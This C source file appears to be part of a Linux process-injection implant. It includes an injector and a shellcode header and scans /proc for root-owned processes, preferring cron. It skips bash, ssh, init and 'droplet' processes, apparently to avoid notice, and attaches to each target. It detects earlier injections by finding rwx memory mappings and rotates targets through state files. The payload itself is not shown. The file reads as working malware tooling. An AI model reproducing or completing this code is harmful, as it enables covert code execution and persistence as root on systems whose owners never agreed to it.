#include <stdio.h>
#include <dirent.h>
#include "injector.c"
#include "shellcode.h"
#include <fcntl.h>


int flip_int(int x) {
    return x & 0x000000FF << 24 | x & 0x0000FF00 << 8 | x & 0x00FF0000 >> 8 | x & 0xFF000000 >> 24;
}

int get_uid_proc(int pid) {
    char path[256];
    sprintf(path, "/proc/%d/status", pid);
    FILE *fp = fopen(path, "r");
    if (fp == NULL) {
        return -1;
    }

    char line[256];
    while (fgets(line, sizeof(line), fp)) {
        if (strstr(line, "Uid:") != NULL) {
            int uid;
            sscanf(line, "Uid: %d", &uid);
            fclose(fp);
            return uid;
        }
    }

    fclose(fp);
    return -1;
}

int get_parent_pid(int pid) {
    char path[256];
    sprintf(path, "/proc/%d/status", pid);
    FILE *fp = fopen(path, "r");
    if (fp == NULL) {
        return -1;
    }

    char line[256];
    while (fgets(line, sizeof(line), fp)) {
        if (strstr(line, "PPid:") != NULL) {
            int ppid;
            sscanf(line, "PPid: %d", &ppid);
            fclose(fp);
            return ppid;
        }
    }

    fclose(fp);
    return -1;
}

int already_injected(int pid) {
    char *path = malloc(0x28);
    char *line = malloc(0x100);

    // iterate thorugh all procs and see if a child is already injected
    DIR *dir;
    struct dirent *entry;
    if (!(dir = opendir("/proc"))) {
        return 0;
    }
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_DIR) {
            char *name = entry->d_name;
            if (only_digits(name)) {
                if (get_parent_pid(atoi(name)) == pid) {
                    // log_info("Found child process of %d with PID %d\n", pid, atoi(name));
                    sprintf(path, "/proc/%s/maps", name);
                    FILE *fp = fopen(path, "r");
                    if (fp == NULL) {
                        continue;
                    }
                    while (fgets(line, 0x100, fp)) {
                        if (strstr(line, "rwx") != NULL) {
                            fclose(fp);
                            return 1;
                        }
                    }
                }
            }
        }
    }
    closedir(dir);
    return 0;
}

int check_availability(int pid) {
    char path[256];
    sprintf(path, "/proc/%d/cmdline", pid);
    FILE *fp = fopen(path, "r");
    if (fp == NULL) {
        return 1;
    }
    char cmdline[256];
    fgets(cmdline, sizeof(cmdline), fp);
    if (strlen(cmdline) == 0) {
        fclose(fp);
        return 0;
    }
    if (strstr(cmdline, "/lib") != NULL || strstr(cmdline, "bash") != NULL || strstr(cmdline, "ssh") != NULL || strstr(cmdline, "init") != NULL || strstr(cmdline, "droplet") != NULL) {
        fclose(fp);
        return 0;
    }
    fclose(fp);
    return 1;
}


int get_cron_pid() {
    DIR *dir;
    struct dirent *entry;
    if (!(dir = opendir("/proc"))) {
        return -1;
    }
    char cmdline[256];
    char *path = malloc(0x28);
    strcpy(path, "/proc/");
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_DIR) {
            char *name = entry->d_name;
            if (only_digits(name)) {
                strcpy(path + 6, name);
                strcpy(path + 6 + strlen(name), "/cmdline");

                FILE *fp = fopen(path, "r");
                if (fp != NULL) {
                    fgets(cmdline, sizeof(cmdline), fp);
                    fclose(fp);
                    if (strstr(cmdline, "cron") != NULL) {
                        return atoi(name);
                    }
                }
            }
        }
    }
    closedir(dir);
    return -1;
}

int find_pid() {
    DIR *dir;
    struct dirent *entry;
    if (!(dir = opendir("/proc"))) {
        return -1;
    }
    
    char data[2], proc_name[12];
    int idx = 1;
    memset(proc_name, 0, sizeof(proc_name));

    FILE* fd = fopen(IDX_DIR, "r");
    if (fd == NULL) {
        fd = fopen(IDX_DIR, "w");
        fwrite("\x01", 1, 1, fd);
        idx = 1;
        fclose(fd);
    } else {
        fgets(data, 2, fd);

        FILE *fd_op = fopen(OP_DIR, "r");
        if (fd_op != NULL) {
            char op[2];
            fgets(op, 2, fd_op);
            fclose(fd_op);
            data[0] += op[0];
            data[0] = data[0] % 2;
        }


        fclose(fd);
        fd = fopen(IDX_DIR, "w");
        // ftruncate(fd, 0);
        if (data[0] == '\x00') {
            idx = 1;
            fwrite("\x01", 1, 1, fd);
        } else {
            idx = 2;
            fwrite("\x00", 1, 1, fd);
        }
        fclose(fd);
    }

    char cmdline[256];
    char *path = malloc(0x28);
    strcpy(path, "/proc/");

    int crt = 1;
    // log_info("Searching for process with index %d\n", idx);

    if (idx == 1) {
        int cron_pid = get_cron_pid();
        if (cron_pid != -1 && get_uid_proc(cron_pid) == 0 && check_availability(cron_pid) && !attach(cron_pid) && !already_injected(cron_pid)) {
            printf("cron\n");
            detach(cron_pid);
            // log_info("Found cron process with PID %d and UID %d\n", cron_pid, get_uid_proc(cron_pid));
            return cron_pid;
        }
    }
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_DIR) {
            char *name = entry->d_name;
            if (only_digits(name)) {
                strcpy(path + 6, name);
                strcpy(path + 6 + strlen(name), "/cmdline");

                FILE *fp = fopen(path, "r");
                if (fp != NULL) {
                    fgets(cmdline, sizeof(cmdline), fp);
                    fclose(fp);
                    
                   if (get_uid_proc(atoi(name)) == 0 && check_availability(atoi(name)) && !attach(atoi(name)) && !already_injected(atoi(name))) {
                        detach(atoi(name));

                        if (crt == idx) {
                            // log_info("Found process with PID %s and UID %d\n", name, get_uid_proc(atoi(name)));
                            return atoi(name);
                        } else
                            crt++;
                    }
                }
            }

        }
    }

    closedir(dir);

}

int main(int argc, char **argv) {
    int cron_pid = get_cron_pid();
    printf("already_injected: %d\n", already_injected(cron_pid));
    return 0;
}